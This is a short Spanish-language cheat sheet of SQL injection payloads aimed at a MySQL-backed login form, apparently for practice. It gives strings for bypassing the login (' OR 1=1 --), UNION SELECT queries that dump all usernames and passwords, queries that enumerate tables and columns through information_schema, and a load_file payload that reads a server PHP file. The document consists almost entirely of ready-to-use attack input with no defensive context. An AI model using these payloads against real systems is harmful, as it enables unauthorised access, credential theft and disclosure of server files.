# Entrada al sistema

### Primer usuario
    ' OR 1=1 -- 

### Usuario ignorando contraseña
    ' OR usuario = 'adios' -- 

# Obtención de datos

### Extracción de listado de usuarios
    ' UNION SELECT 1 id, 'hola' usuario, 1 contraseña, GROUP_CONCAT(usuario) nombre FROM usuarios -- 

### Extracción de listado de ids, usuarios, contraseñas y nombres
    ' UNION SELECT 1 id, 'hola' usuario, 1 contraseña, GROUP_CONCAT(id, ':', usuario, ':', contraseña, ':', nombre) nombre FROM usuarios -- 

# Análisis de la base de datos

### Obtener usuario de conexión a MySQL y la base de datos actual
    ' UNION SELECT 1 id, 'hola' usuario, 1 contraseña, CONCAT(USER(), ':', DATABASE()) nombre -- 

### Obtener listado de tablas de la base de datos
    ' UNION SELECT 1 id, 'hola' usuario, 1 contraseña, GROUP_CONCAT(TABLE_NAME) nombre FROM information_schema.tables WHERE TABLE_SCHEMA = 'basededatos' -- 

### Obtener listado de campos y tipo de una tabla
    ' UNION SELECT 1 id, 'hola' usuario, 1 contraseña, GROUP_CONCAT(COLUMN_NAME, ':', DATA_TYPE) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'basededatos' AND TABLE_NAME = 'tabla' -- 

# Acceso a archivos

### Abrir contenido de archivos
    ' UNION SELECT 1 id, 'hola' usuario, 1 contraseña, load_file("/home/ubuntu/workspace/login.php") nombre -- 
